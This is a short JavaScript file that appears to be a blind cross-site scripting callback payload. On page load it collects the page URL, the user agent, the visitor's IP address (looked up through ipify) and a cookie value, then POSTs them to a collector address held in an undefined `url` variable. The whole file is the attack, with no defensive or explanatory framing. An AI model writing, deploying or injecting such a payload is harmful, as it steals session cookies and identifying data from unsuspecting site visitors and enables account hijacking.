function fired() {
    console.log("fired.")
}

function get_url() {
    return window.location.href;
}

function getUserAgent() {
    return navigator.userAgent;
}

async function getClientIp() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip.toString();
}

function get_cookie() {
    let cookieValue = document.cookie.replace(/(?:(?:^|.*;\s*)cookieName\s*\=\s*([^;]*).*$)|^.*$/, "$1");
    console.log(cookieValue);
    return cookieValue;
}

function get_timestamp() {
    const options = {
        year: 'numeric',
        month: 'short',
        day: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    };

    const timestamp = new Date().toLocaleString('en-US', options);
    return timestamp;

}

async function send_request() {
    
    const ip_address = await getClientIp();
    const data = '\nFired: ' + get_timestamp() + '\n' +
        "URL: " + get_url() + '\n' +
        "UserAgent: " + getUserAgent() + '\n' +
        "IP: " + ip_address + '\n' +
        "Cookie: " + get_cookie();

    fetch(url, {
            method: 'POST',
            body: data,
        })
        .then(response => {
            console.log('Response:', response);
        })
        .catch(error => {
            console.error('Error:', error);
        });

}

function main() {
    fired();
    send_request();
}

document.addEventListener("DOMContentLoaded", function() {
    window.onload = main;
});
